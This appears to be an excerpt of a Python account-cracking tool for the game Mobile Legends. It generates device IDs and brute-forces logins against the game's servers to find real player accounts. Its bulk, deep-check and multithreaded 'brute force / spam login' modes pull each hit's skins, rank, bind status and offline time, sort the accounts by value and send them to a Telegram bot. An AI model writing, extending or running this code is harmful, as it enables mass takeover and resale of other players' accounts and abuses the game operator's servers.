#!/usr/bin/env python3
# ===================================================================
# PREMIUM DEVID SEKER - ULTRA MLBB TOOLS v12.0
# Created by: @PRIME_MICK
# Features: API/Direct/Both + Error Hits + Deep Check (5 Retry) +
#           Moonton Bind + 3rd Info + Collector Level + Brute Force
#           + Full Info Check on Bulk (Deep-style)
# ===================================================================
...
# Bulk Full Info Check (deep-style info pull)
BULK_INFO_RETRIES = 2
BULK_INFO_DELAY = 1.0
...
FILES = {
    ...
    "deep_check_still_error": os.path.join(OUTPUT_DIR, FOLDERS["deep_hits"], "deep_check_still_error.txt"),
...
{Fore.YELLOW}═══════════════════════════════════════════════════════════════
{Fore.LIGHTBLACK_EX}              Created by: {Fore.CYAN}{ADMIN_USERNAME_DISPLAY}{Fore.LIGHTBLACK_EX} | v12.0
...
HIT_COUNTERS = {
    ...
    'collector_expert': 0, 'collector_renowned': 0, 'collector_exalted': 0,
    'collector_mega': 0, 'collector_sultan': 0,
}
...
# ────────────────────────────────────────────────────────────────
# 7. V2L + MOONTON + OFFLINE + RANK + COLLECTOR
# ────────────────────────────────────────────────────────────────
...
COLLECTOR_LEVELS = [
    (280000, "Sultan Collector"),
    (160000, "Mega Collector"),
    (84000, "Exalted Collector"),
    (44000, "Renowned Collector"),
    (22000, "Expert Collector"),
    (10000, "Senior Collector"),
    (4000, "Junior Collector"),
    (1000, "Amateur Collector"),
]
...
def get_collector_category(level: str) -> str:
    l = level.lower()
...
def estimate_collection_points(skin_count: int, collector_skins: int = 0,
                                legend_skins: int = 0, grand_skins: int = 0) -> int:
    if collector_skins or legend_skins or grand_skins:
        return (collector_skins * 2000 + legend_skins * 4000 +
                grand_skins * 3000 + max(0, skin_count - collector_skins - legend_skins - grand_skins) * 100)
    return skin_count * 200
...
def format_account_card(device, acc, zone, pd, mode="DIRECT"):
    """Clean premium info format - no emoji"""
    return "\n".join([
        "=" * 60,
        f"PREMIUM ACCOUNT INFO ({mode})",
        "=" * 60,
        f"DEVICE ID    : {device}",
        f"ROLE ID      : {acc}",
        f"SERVER ID    : {zone}",
        ...
        f"COLLECTOR    : {pd.get('collector_level', 'None')}",
        f"HIGH RANK    : {pd.get('highest_rank', 'N/A')}",
        f"CURRENT RANK : {pd.get('current_rank', 'Unranked')}",
        f"MOONTON      : {pd.get('mt_status', 'clear').upper()}",
        f"3RD PARTY    : {pd.get('third_party_status', 'clear').upper()}",
        f"OFFLINE TIME : {pd.get('offline_days', 'N/A')}",
        "-" * 60,
...
def save_account(account_info, player_data, mode="DIRECT"):
    ...
    with SAVE_LOCK:
        ...
        if collector_cat:
            collector_file = os.path.join(OUTPUT_DIR, FOLDERS["collector"], f"{collector_cat}.txt")
            if not is_already_saved(device, collector_file):
                with open(collector_file, "a", encoding='utf-8') as f:
                    f.write(card_text + "\n")
    ...
    if should_send_to_telegram(rank_category, skin, highest_rank):
        ...
        tg_message = (
            ...
            f"─────────────────────────\n"
            f"DEVICE ID    : <code>{device}</code>\n"
            f"ROLE ID      : <b>{acc}</b>\n"
            f"SERVER ID    : <b>{zone}</b>\n"
            f"NAME         : <b>{nick}</b>\n"
            f"LEVEL        : {player_data.get('level', 'N/A')}\n"
            f"SKINS        : {skin}\n"
            f"HEROES       : {player_data.get('hero_count', 0)}\n"
            f"COLLECTOR    : {collector_level}\n"
            f"HIGH RANK    : {highest_rank}\n"
            f"CURRENT RANK : {cur_rank}\n"
            f"MOONTON      : {mt.upper()}\n"
            f"3RD PARTY    : {third.upper()}\n"
            f"OFFLINE TIME : {player_data.get('offline_days', 'N/A')}\n"
            f"V2L          : {v2l_text}\n"
            f"MT MAIL      : {mt_mail.upper()}\n"
            f"═════════════════════════════════\n"
...
# ────────────────────────────────────────────────────────────────
# 10. CHECKERS (FULL INFO PULL — Deep-style)
# ────────────────────────────────────────────────────────────────

def process_direct(device_id, account_id, zone_id):
    """Full info pull from MLBB server — same depth as Deep Check"""
    try:
        with GameConnection(device_id=device_id) as conn:
            if not conn.login_to_login_server():
                return {'status': 'FAIL'}

            # Try game server connect (retry once)
            game_ok = False
            ...
            if not game_ok:
                return {'status': 'ERROR_HIT', 'reason': 'Game server connect failed'}
            ...
            # Collector points — try direct tag, fallback estimate
            collection_points = pd.get(120) or skin_info.get(30) or 0
            if not collection_points:
                collector_skins = skin_info.get(25, 0) or pd.get(121, 0)
                legend_skins = skin_info.get(26, 0) or pd.get(122, 0)
                grand_skins = skin_info.get(27, 0) or pd.get(123, 0)
                collection_points = estimate_collection_points(
                    skin_cnt, collector_skins, legend_skins, grand_skins
                )
            collector_level = get_collector_level(collection_points)
...
def process_direct_with_retry(device_id, account_id, zone_id, retries=BULK_INFO_RETRIES, delay=BULK_INFO_DELAY):
    """Deep-style retry for Bulk Check — makes sure info pull is complete"""
    last = {'status': 'FAIL', 'reason': 'Unknown'}
    for attempt in range(1, retries + 2):
        last = process_direct(device_id, account_id, zone_id)
        if last.get('status') == 'SUCCESS':
            return last
        if last.get('status') == 'BANNED':
            return last
        if attempt <= retries:
            time.sleep(delay)
    return last
        ...
        if data.get("status") == 0 and data.get("data"):
            ...
            return {
                ...
                'data': {
                    ...
                    'collector_level': d.get('collector_level', 'None'),
                    'collection_points': d.get('collection_points', 0),
...
# ────────────────────────────────────────────────────────────────
# 11. BULK CHECK (Full Info — Deep-style)
# ────────────────────────────────────────────────────────────────

def run_bulk_detail():
    global LIVE_STATS, CHECK_MODE
    print_header("PREMIUM BULK CHECK — FULL INFO")

    print(f"{Fore.CYAN}Select Check Mode:{Style.RESET_ALL}\n")
    print(f"{Fore.YELLOW}[1]{Style.RESET_ALL} {Fore.GREEN}DIRECT{Style.RESET_ALL} — MLBB server (Full info, deep-style)")
    print(f"{Fore.YELLOW}[2]{Style.RESET_ALL} {Fore.CYAN}API{Style.RESET_ALL}    — checkton.online (Basic)")
    print(f"{Fore.YELLOW}[3]{Style.RESET_ALL} {Fore.MAGENTA}BOTH{Style.RESET_ALL}   — Direct first, API fallback")
    ...
    if CHECK_MODE in ('DIRECT', 'BOTH'):
        print(f"{Fore.LIGHTBLACK_EX}  Full Info Pull: ON (Moonton, 3rd, Collector, V2L, Offline)")
        print(f"  Retries per device: {BULK_INFO_RETRIES}{Style.RESET_ALL}\n")
    ...
    def check_one(dev):
        ...
        if CHECK_MODE == 'DIRECT':
            result = process_direct_with_retry(dev, acc, zone)
        elif CHECK_MODE == 'API':
...
# ────────────────────────────────────────────────────────────────
# 12. DEEP CHECK — 5 RETRIES + SEPARATE OUTPUT
# ────────────────────────────────────────────────────────────────

def deep_check_single_device(device_id: str) -> Dict[str, Any]:
    """Deep check with 5 retries — full info pull"""
    last_reason = "Unknown"
...
def run_deep_check():
    """Menu [9] — Deep Check Error Hits (5 retries) — Hits & Banned separated from Still-Error"""
    print_header("DEEP CHECK — ERROR HITS (5 RETRIES)")
    ...
    # Truncate output files at start of deep check
    for fp in [FILES["deep_check_hits"], FILES["deep_check_still_error"]]:
        try:
    ...
    def check_one(dev_info):
        ...
        if status == 'HIT':
            ...
            with SAVE_LOCK:
                with open(FILES["deep_check_hits"], "a", encoding='utf-8') as f:
                    ...
                    f.write(
                        ...
                        f"COLLECTOR    : {d.get('collector_level', 'None')}\n"
                        f"HIGH RANK    : {d['highest_rank']}\n"
                        f"CURRENT RANK : {d['current_rank']}\n"
                        f"MOONTON      : {d['mt_status'].upper()}\n"
                        f"3RD PARTY    : {d['third_party_status'].upper()}\n"
                        f"OFFLINE TIME : {d['offline_days']}\n"
                        f"V2L          : {d['v2l_status']}\n"
                        f"MT MAIL      : {d['mt_mail_status'].upper()}\n"
            ...
            # Save only still-error devices to dedicated file
            with SAVE_LOCK:
                with open(FILES["deep_check_still_error"], "a", encoding='utf-8') as f:
                    f.write(
                        "=" * 60 + "\n"
                        f"STILL ERROR AFTER DEEP CHECK\n"
                        f"Device ID    : {device}\n"
            ...
            banned_devices.append({
                'device': device,
                'reason': result.get('reason', 'Banned'),
            })

            # Save banned devices to banned file (from Error Hits)
            with SAVE_LOCK:
                with open(os.path.join(OUTPUT_DIR, FOLDERS["error"], "banned_accounts.txt"), "a", encoding='utf-8') as f:
                    f.write(f"{device} | DEEP_CHECK_BANNED | {result.get('reason', 'Banned')}\n")
    ...
    report_lines = [
        ...
        f"STILL ERROR    : {stats['still_error']}",
    ...
    if new_hits:
        ...
        for i, h in enumerate(new_hits, 1):
            report_lines += [
                ...
                f"COLLECTOR    : {h.get('collector_level', 'None')}",
                f"HIGH RANK    : {h['highest_rank']}",
                f"CURRENT RANK : {h['current_rank']}",
                f"MOONTON      : {h['mt_status'].upper()}",
                f"3RD PARTY    : {h['third_party_status'].upper()}",
                f"OFFLINE TIME : {h['offline_days']}",
                ""
            ]

    if banned_devices:
        report_lines += ["=" * 80, f"=== BANNED ({len(banned_devices)}) ===", "=" * 80, ""]
        for i, b in enumerate(banned_devices, 1):
            report_lines += [
                f"----- BANNED #{i} -----",
                f"DEVICE ID    : {b['device']}",
                f"REASON       : {b['reason']}",
                ""
            ]

    if still_errors:
        report_lines += ["=" * 80, f"=== STILL ERROR ({len(still_errors)}) ===", "=" * 80, ""]
        for i, e in enumerate(still_errors, 1):
            report_lines += [
                f"----- STILL ERROR #{i} -----",
                f"DEVICE ID    : {e['device']}",
                f"REASON       : {e['reason']}",
                f"ATTEMPTS     : {e['attempts']}/{DEEP_CHECK_RETRIES}",
                ""
            ]
    ...
    print(f"  {Fore.MAGENTA}STILL ERROR   : {stats['still_error']:,}{Style.RESET_ALL}")
    ...
    print(f"  Hits        : {FILES['deep_check_hits']}")
    print(f"  Still Error : {FILES['deep_check_still_error']}")
    print(f"  Report      : {FILES['deep_check_report']}")
    ...
    if stats['hit'] > 0 or stats['still_error'] > 0:
        ...
        report_caption = (
            ...
            f"Still Error : <b>{stats['still_error']}</b>\n"
...
def send_hits_report_to_tg():
    ...
    for i, h in enumerate(normal, 1):
        lines += [
            ...
            f"ROLE ID      : {h.get('acc', '?')}",
            f"SERVER ID    : {h.get('zone', '?')}",
            f"NAME         : {h.get('nickname', 'N/A')}",
            f"LEVEL        : {h.get('level', '?')}",
            f"SKINS        : {h.get('skin', 0)}",
            f"HEROES       : {h.get('hero', 0)}",
            f"COLLECTOR    : {h.get('collector', 'None')}",
            f"HIGH RANK    : {h.get('max_rank', 'N/A')}",
            f"CURRENT RANK : {h.get('rank', 'N/A')}",
            f"MOONTON      : {h.get('mt', 'N/A').upper()}",
            f"3RD PARTY    : {h.get('3rd', 'N/A').upper()}",
            f"OFFLINE TIME : {h.get('offline', 'N/A')}",
            f"V2L          : {h.get('v2l', 'N/A')}",
            ""
        ]
...
# ────────────────────────────────────────────────────────────────
# 14. STATS + UTILS (with Collector Level stats)
# ────────────────────────────────────────────────────────────────

def show_stats():
    print_header("STATISTICS")
    with COUNTER_LOCK:
        print(f"{Fore.CYAN}Ranks:{Style.RESET_ALL}")
        ...
        print(f"\n{Fore.CYAN}Collector Levels:{Style.RESET_ALL}")
        collector_order = [
            ('collector_sultan', 'Sultan Collector'),
            ('collector_mega', 'Mega Collector'),
            ('collector_exalted', 'Exalted Collector'),
            ('collector_renowned', 'Renowned Collector'),
            ('collector_expert', 'Expert Collector'),
            ('collector_senior', 'Senior Collector'),
            ('collector_junior', 'Junior Collector'),
            ('collector_amateur', 'Amateur Collector'),
        ]
        for key, label in collector_order:
            c = HIT_COUNTERS.get(key, 0)
            color = Fore.YELLOW if 'sultan' in key else Fore.CYAN if 'mega' in key else Fore.WHITE
            print(f"  {label:<22}: {color}{c:,}{Style.RESET_ALL}")
        ...
        print(f"  Sultan Skin(200+) : {Fore.YELLOW}{HIT_COUNTERS.get('sultan', 0):,}{Style.RESET_ALL}")
...
# ────────────────────────────────────────────────────────────────
# 16. SINGLE CHECK (Full Info)
# ────────────────────────────────────────────────────────────────

def run_single_check():
    print_header("SINGLE CHECK — FULL INFO")
    dev = input(f"{Fore.YELLOW}Device ID: {Style.RESET_ALL}").strip()
    if not dev: return

    print(f"\n{Fore.CYAN}Checking (Full Info Pull)...{Style.RESET_ALL}")
    acc, zone, stat = GameLogin(dev).run()
    if not acc or not zone:
    ...
    if status == 'SUCCESS':
        d = result['data']
        print(f"\n{Fore.GREEN}NORMAL HIT — FULL INFO{Style.RESET_ALL}")
        print(format_account_card(dev, acc, zone, d, 'DIRECT'))
    elif status == 'ERROR_HIT':
...
# ────────────────────────────────────────────────────────────────
# 17. BRUTE FORCE / SPAM LOGIN (Menu 10)
# ────────────────────────────────────────────────────────────────

def run_brute_force():
    """Menu [10] — Brute Force / Spam Login with Full Info Pull"""
    global LIVE_STATS
    print_header("BRUTE FORCE / SPAM LOGIN")

    print(f"{Fore.CYAN}This mode repeatedly generates device IDs and checks them")
    print(f"with Full Info Pull until hits are found.{Style.RESET_ALL}\n")

    print(f"{Fore.YELLOW}[1]{Style.RESET_ALL} Brute Force by Count (N devices)")
    print(f"{Fore.YELLOW}[2]{Style.RESET_ALL} Brute Force by Time (N minutes)")
    print(f"{Fore.YELLOW}[3]{Style.RESET_ALL} Brute Force until N Hits found")
    print(f"{Fore.YELLOW}[0]{Style.RESET_ALL} Back\n")

    mode_ch = input(f"{Fore.CYAN}Choose (0-3): {Style.RESET_ALL}").strip()
    if mode_ch == '0' or mode_ch not in ('1', '2', '3'):
        return

    threads_in = input(f"{Fore.CYAN}Threads (default {BRUTE_FORCE_THREADS}): {Style.RESET_ALL}").strip()
    threads = int(threads_in) if threads_in.isdigit() else BRUTE_FORCE_THREADS
    ...
    if mode_ch == '1':
        n = input(f"{Fore.CYAN}How many devices to try? (default 1000): {Style.RESET_ALL}").strip()
        target_count = int(n) if n.isdigit() else 1000
        mode_label = f"COUNT={target_count}"
    elif mode_ch == '2':
        n = input(f"{Fore.CYAN}How many minutes? (default 10): {Style.RESET_ALL}").strip()
        target_minutes = float(n) if n else 10.0
        mode_label = f"TIME={target_minutes}min"
    else:
        n = input(f"{Fore.CYAN}Stop after how many hits? (default 5): {Style.RESET_ALL}").strip()
        target_hits = int(n) if n.isdigit() else 5
        mode_label = f"HITS={target_hits}"

    print(f"\n{Fore.CYAN}Starting Brute Force ({mode_label}) with {threads} threads...{Style.RESET_ALL}")
    print(f"{Fore.LIGHTBLACK_EX}{'─'*80}{Style.RESET_ALL}")
    ...
    def brute_one(_):
        ...
        device = generate_verified_device()
        ...
        acc, zone, stat = GameLogin(device).run()
        if not acc or not zone:
            with stats['lock']:
                stats['invalid'] += 1
                h = stats['hits']
                ...
                inv = stats['invalid']
            sys.stdout.write(
                f"\r{Fore.LIGHTBLACK_EX}✗{Style.RESET_ALL} [{n}] "
                f"{device[:35]}... → "
                f"{Fore.GREEN}H:{h}{Style.RESET_ALL} "
                f"{Fore.RED}B:{b}{Style.RESET_ALL} "
                f"{Fore.MAGENTA}E:{eh}{Style.RESET_ALL} "
        ...
        result = process_direct_with_retry(device, acc, zone, retries=0, delay=0)
        status = result.get('status')

        if status == 'SUCCESS':
            data = result['data']
            save_account(
                {'Device id': device, 'role_id': acc, 'zone_id': zone},
                data, 'BRUTE_FORCE'
            )
            with stats['lock']:
                stats['hits'] += 1
            ...
            sys.stdout.write(
                f"\r{Fore.GREEN}✓{Style.RESET_ALL} [{n}] "
                f"{Fore.YELLOW}{device[:30]}...{Style.RESET_ALL} → "
                f"acc={Fore.CYAN}{acc}{Style.RESET_ALL} "
                f"nick={Fore.GREEN}{data['nickname']}{Style.RESET_ALL} | "
                f"{Fore.GREEN}H:{h}{Style.RESET_ALL} "
                f"{Fore.RED}B:{b}{Style.RESET_ALL} "
                f"{Fore.MAGENTA}E:{eh}{Style.RESET_ALL} "
                f"{Fore.LIGHTBLACK_EX}I:{inv} ({speed:.1f}/s){Style.RESET_ALL}\n"
            ...
            if mode_ch == '3' and stats['hits'] >= target_hits:
                stats['stop'] = True

        elif status == 'ERROR_HIT':
            save_error_hit(device, acc, zone, result.get('reason', 'Error'), 'BRUTE_FORCE')
            with stats['lock']:
                h = stats['hits']
                b = stats['banned']
                eh = stats['error_hits']
                inv = stats['invalid']
            sys.stdout.write(
                f"\r{Fore.MAGENTA}⚠{Style.RESET_ALL} [{n}] "
                f"{device[:30]}... → "
                f"{Fore.GREEN}H:{h}{Style.RESET_ALL} "
                f"{Fore.RED}B:{b}{Style.RESET_ALL} "
                f"{Fore.MAGENTA}E:{eh}{Style.RESET_ALL} "
            ...
            with stats['lock']:
                ...
                inv = stats['invalid']
            sys.stdout.write(
                f"\r{Fore.RED}✗{Style.RESET_ALL} [{n}] BANNED — {device[:30]}...\n"
            )
            sys.stdout.flush()
            ...
            with stats['lock']:
                stats['invalid'] += 1
            sys.stdout.write(
                f"\r{Fore.RED}✗{Style.RESET_ALL} [{n}] FAIL — {device[:30]}...\n"
            )
            sys.stdout.flush()
    ...
    try:
        if mode_ch == '1':
            with ThreadPoolExecutor(max_workers=threads) as ex:
                list(ex.map(brute_one, range(target_count)))
        elif mode_ch == '2':
            end_time = time.time() + (target_minutes * 60)
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futures = []
                while time.time() < end_time and not stats['stop']:
                    futures.append(ex.submit(brute_one, 0))
                    time.sleep(0.01)
    ...
    print(f"\n{Fore.CYAN}{'─'*80}{Style.RESET_ALL}")
    print(f"\n{Fore.GREEN}✓ Brute Force Complete!{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Mode       : {mode_label}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Checked    : {stats['checked']:,}{Style.RESET_ALL}")
    print(f"  {Fore.GREEN}Hits       : {stats['hits']:,}{Style.RESET_ALL}")
    print(f"  {Fore.MAGENTA}Error Hits : {stats['error_hits']:,}{Style.RESET_ALL}")
    print(f"  {Fore.RED}Banned     : {stats['banned']:,}{Style.RESET_ALL}")
    print(f"  {Fore.LIGHTBLACK_EX}Invalid    : {stats['invalid']:,}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Duration   : {duration:.1f}s | Speed: {stats['checked']/max(duration,1):.1f}/s{Style.RESET_ALL}")
...
def main():
    ensure_dirs()
    while True:
        print_header("PREMIUM DEVID SEKER v12.0")
        print(f"{Fore.YELLOW}[1]{Style.RESET_ALL} Generate Device IDs")
        print(f"{Fore.YELLOW}[2]{Style.RESET_ALL} Bulk Check (Full Info — DIRECT/API/BOTH)")
        print(f"{Fore.YELLOW}[3]{Style.RESET_ALL} Statistics (Collector Levels included)")
        print(f"{Fore.YELLOW}[4]{Style.RESET_ALL} Clean Output")
        print(f"{Fore.YELLOW}[5]{Style.RESET_ALL} Test Telegram")
        print(f"{Fore.YELLOW}[6]{Style.RESET_ALL} Single Check (Full Info)")
        print(f"{Fore.YELLOW}[7]{Style.RESET_ALL} Send Full Report (TG)")
        print(f"{Fore.YELLOW}[8]{Style.RESET_ALL} View Error Hits")
        print(f"{Fore.YELLOW}[9]{Style.RESET_ALL} {Fore.GREEN}DEEP CHECK{Style.RESET_ALL} — Re-check Error Hits (5 Retries)")
        print(f"{Fore.YELLOW}[10]{Style.RESET_ALL} {Fore.RED}BRUTE FORCE{Style.RESET_ALL} — Spam Login + Full Info")
        print(f"{Fore.YELLOW}[0]{Style.RESET_ALL} Exit\n")

        choice = input(f"{Fore.CYAN}Choose (0-10): {Style.RESET_ALL}").strip()
        ...
        elif choice == '10': run_brute_force()
